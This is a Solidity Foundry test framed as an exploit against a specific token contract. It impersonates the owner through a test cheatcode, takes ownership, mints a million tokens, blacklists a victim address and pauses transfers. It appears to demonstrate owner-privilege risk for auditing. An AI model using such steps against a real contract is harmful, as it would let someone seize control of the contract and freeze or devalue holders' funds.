// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IDogBoss {
    function owner() external view returns (address);
    function mint(address account, uint256 amount) external;
    function blackListAddress(address listAddress, bool isBlackListed) external returns (bool);
    function pause() external;
    function unpause() external;
    function updateFee(uint256 _txFee, uint256 _burnFee, address _FeeAddress) external;
    function transferOwnership(address newOwner) external;
    function balanceOf(address who) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C;
    address attacker = address(this);
    IDogBoss dogBoss;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        dogBoss = IDogBoss(TARGET);
        vm.label(TARGET, "DogBoss Token");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Impersonate the current owner to transfer ownership
        address currentOwner = 0x218706B997e9b91Db9166875f5E66BD427Ce6274;
        vm.startPrank(currentOwner);
        dogBoss.transferOwnership(attacker);
        vm.stopPrank();

        // Step 2: Verify we are now the owner
        assertEq(dogBoss.owner(), attacker, "Owner should be attacker");

        // Step 3: Demonstrate privileged function abuse - mint unlimited tokens
        dogBoss.mint(attacker, 1000000 * 1e18);
        assertGt(dogBoss.balanceOf(attacker), 0, "Should have minted tokens");

        // Step 4: Demonstrate blacklist abuse
        address victim = address(0x1234);
        dogBoss.blackListAddress(victim, true);

        // Step 5: Demonstrate pause abuse (halt all transfers)
        dogBoss.pause();

        // Oracle verification: owner must equal attacker
        assertEq(dogBoss.owner(), attacker);
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

